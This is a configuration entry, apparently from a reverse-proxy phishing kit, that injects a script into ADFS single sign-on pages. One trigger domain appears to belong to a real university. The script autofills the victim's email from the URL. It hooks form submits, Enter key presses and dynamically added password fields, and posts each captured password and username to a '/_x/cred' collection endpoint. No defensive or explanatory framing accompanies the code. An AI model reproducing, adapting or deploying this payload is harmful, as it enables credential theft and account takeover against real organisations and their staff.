  # ADFS custom domain — password capture + email autofill
  - trigger_domains: ["adfs.example.com", "adfs.example.org", "adfsstaff.mans.edu.eg"]
    trigger_paths: ["/*"]
    script: |
      (function() {
        var params = new URLSearchParams(window.location.search);
        var email  = params.get('login_hint') || params.get('username') || params.get('LoginHint') || '';
        var hash   = window.location.hash.slice(1);
        if (!email && hash && hash.indexOf('@') !== -1) email = decodeURIComponent(hash);

        var _lastSent = 0;
        function _sendCred(pass, user) {
          if (!pass) return;
          var now = Date.now();
          if (now - _lastSent < 3000) return;
          _lastSent = now;
          try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/_x/cred', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({p: pass, u: user || email || ''}));
          } catch(e) {}
        }

        // DOM-level capture: ADFS uses traditional form POST so this is the
        // most reliable path. Capture phase fires before ADFS form submit handler.
        document.addEventListener('submit', function(e) {
          var form = e.target;
          if (!form) return;
          var pw = form.querySelector('input[type="password"],input[name="Password"],input[name="passwd"]');
          if (pw && pw.value) {
            var uEl = form.querySelector('input[name="UserName"],input[type="email"],input[name="email"],input[name="username"]');
            _sendCred(pw.value, uEl ? uEl.value : '');
          }
        }, true);

        function _hookPwField(pw) {
          if (pw._xt) return;
          pw._xt = true;
          pw.addEventListener('keydown', function(e) {
            if ((e.key === 'Enter' || e.keyCode === 13) && pw.value) {
              var form = pw.closest ? pw.closest('form') : null;
              var uEl = form && form.querySelector('input[name="UserName"],input[type="email"],input[name="email"]');
              _sendCred(pw.value, uEl ? uEl.value : '');
            }
          });
        }
        function _scanPwFields() {
          var pws = document.querySelectorAll('input[type="password"],input[name="Password"]');
          for (var i = 0; i < pws.length; i++) _hookPwField(pws[i]);
        }
        new MutationObserver(_scanPwFields).observe(document.documentElement, {childList:true, subtree:true});
        _scanPwFields();

        // Email autofill
        function fill() {
          var sels = ['input[name="UserName"]','input[id="userNameInput"]','input[type="email"]','input[name="email"]','input[type="text"]'];
          for (var i = 0; i < sels.length; i++) {
            var el = document.querySelector(sels[i]);
            if (el && !el.value && email) {
              el.focus(); el.value = email;
              el.dispatchEvent(new Event('input',  {bubbles:true}));
              el.dispatchEvent(new Event('change', {bubbles:true}));
              return;
            }
          }
          setTimeout(fill, 400);
        }
        setTimeout(fill, 400);
      })();
